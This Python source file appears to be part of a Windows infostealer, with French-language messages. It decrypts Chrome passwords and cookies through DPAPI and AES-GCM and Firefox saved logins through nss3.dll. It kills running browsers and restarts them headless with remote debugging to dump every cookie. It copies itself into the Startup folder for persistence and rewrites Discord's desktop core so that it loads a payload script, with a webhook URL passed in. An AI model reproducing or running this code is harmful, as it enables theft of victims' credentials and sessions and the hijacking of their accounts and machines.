import os
import json
import base64
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import ctypes
from ctypes import wintypes
import tempfile
import shutil
import subprocess
import requests
import websocket
import time
import sqlite3
import glob

def expand(path: str) -> str:
    return os.path.expandvars(
        path.replace("%LOCALAPPDATA%", os.getenv("LOCALAPPDATA", ""))
            .replace("%APPDATA%", os.getenv("APPDATA", ""))
    )

def get_master_key(local_state_path: str) -> bytes | None:
    full_path = expand(local_state_path)
    if not os.path.exists(full_path):
        return None
    try:
        with open(full_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_value(encrypted: bytes, master_key: bytes) -> str:
    try:
        if encrypted[:3] in (b'v10', b'v11'):
            iv = encrypted[3:15]
            payload = encrypted[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
            return decrypted
        else:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except Exception:
        return "[Chiffré]"

def chrome_time_to_str(chrome_time: int) -> str:
    try:
        return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime("%Y-%m-%d %H:%M")
    except Exception:
        return "N/A"

NSS3_DLL = None
nss_paths = [
    r"C:\Program Files\Mozilla Firefox\nss3.dll",
    r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll",
    os.path.expandvars(r"%PROGRAMFILES%\Mozilla Firefox\nss3.dll"),
    os.path.expandvars(r"%PROGRAMFILES(X86)%\Mozilla Firefox\nss3.dll"),
]
for path in nss_paths:
    if os.path.exists(path):
        NSS3_DLL = ctypes.CDLL(path)
        break

if NSS3_DLL:
    NSS3_DLL.NSS_Init.argtypes = [wintypes.LPCSTR]
    NSS3_DLL.NSS_Init.restype = wintypes.LONG

    class SECItem(ctypes.Structure):
        _fields_ = [
            ("type", wintypes.DWORD),
            ("data", ctypes.POINTER(wintypes.BYTE)),
            ("len", wintypes.DWORD)
        ]

    NSS3_DLL.PK11SDR_Decrypt.argtypes = [ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p]
    NSS3_DLL.PK11SDR_Decrypt.restype = wintypes.LONG

def nss_init(profile_path: str) -> bool:
    if not NSS3_DLL:
        return False
    try:
        return NSS3_DLL.NSS_Init(profile_path.encode('utf-8')) == 0
    except Exception:
        return False

def nss_decrypt(b64_str: str) -> str:
    if not NSS3_DLL:
        return "[NSS manquant]"
    try:
        data = base64.b64decode(b64_str)
        encrypted = SECItem(0, ctypes.cast(data, ctypes.POINTER(wintypes.BYTE)), len(data))
        decrypted = SECItem()
        if NSS3_DLL.PK11SDR_Decrypt(ctypes.byref(encrypted), ctypes.byref(decrypted), None) == 0:
            return ctypes.string_at(decrypted.data, decrypted.len).decode('utf-8', errors='ignore')
        return "[Échec]"
    except Exception:
        return "[Erreur]"

def copy_db(src_path: str, temp_path: str) -> bool:
    try:
        if os.path.exists(src_path):
            shutil.copy2(src_path, temp_path)
            return True
        return False
    except Exception:
        return False

def kill_browser(exe_name):
    subprocess.run(f'taskkill /F /IM {exe_name}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_debug_ws_url(port=9222):
    try:
        res = requests.get(f'http://localhost:{port}/json', timeout=5)
        data = res.json()
        return data[0]['webSocketDebuggerUrl']
    except Exception:
        return None

def start_debug_browser(exe_path, data_dir, profile):
    if not os.path.exists(exe_path):
        return False
    try:
        subprocess.Popen([
            exe_path,
            f'--remote-debugging-port=9222',
            '--remote-allow-origins=*',
            '--headless',
            f'--user-data-dir={data_dir}',
            f'--profile-directory={profile}'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        return True
    except Exception:
        return False

def get_cookies_via_ws():
    url = get_debug_ws_url()
    if not url:
        return None
    try:
        ws = websocket.create_connection(url, timeout=10)
        ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
        response = ws.recv()
        ws.close()
        data = json.loads(response)
        return data.get('result', {}).get('cookies', [])
    except Exception:
        return None

def add_to_startup(exe_path):
    startup_path = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    exe_name = os.path.basename(exe_path)
    dest_path = os.path.join(startup_path, exe_name)
    try:
        if not os.path.exists(dest_path):
            shutil.copy2(exe_path, dest_path)
            print(f" → Persistance : {dest_path}")
    except Exception as e:
        print(f" [ERREUR] Startup: {e}")

def format_cookie_netscape(cookie):
    domain = cookie.get('domain', '')
    secure = "TRUE" if cookie.get('secure') else "FALSE"
    path = cookie.get('path', '/')
    http_only = "TRUE" if cookie.get('httpOnly') else "FALSE"
    expires = str(int(cookie.get('expires', 0))) if cookie.get('expires') else "0"
    name = cookie.get('name', '')
    value = cookie.get('value', '')
    return f"{domain}\t{secure}\t{path}\t{http_only}\t{expires}\t{name}\t{value}"

def inject_discord(webhook_url):
    discord_paths = [
        os.path.expandvars(r"%APPDATA%\discord"),
        os.path.expandvars(r"%LOCALAPPDATA%\Discord"),
        os.path.expandvars(r"%LOCALAPPDATA%\DiscordCanary"),
        os.path.expandvars(r"%LOCALAPPDATA%\DiscordPTB")
    ]
    injection_dir = os.path.join(os.path.dirname(__file__), "injection")
    payload_js = os.path.join(injection_dir, "payload.js")

    if not os.path.exists(injection_dir):
        os.makedirs(injection_dir)

    for base in discord_paths:
        if not os.path.exists(base): continue
        core_dir = None
        for root, dirs, _ in os.walk(base):
            if "discord_desktop_core" in dirs:
                core_dir = os.path.join(root, "discord_desktop_core")
                break
        if not core_dir: continue
        index_js = os.path.join(core_dir, "index.js")
        if os.path.exists(index_js) and "injection" not in open(index_js).read():
            try:
                shutil.copy(index_js, index_js + ".bak")
                with open(index_js, "w") as f:
                    escaped_path = payload_js.replace('\\', '\\\\')
                    f.write(f"require('{escaped_path}'); require('./core.asar');")
            except: pass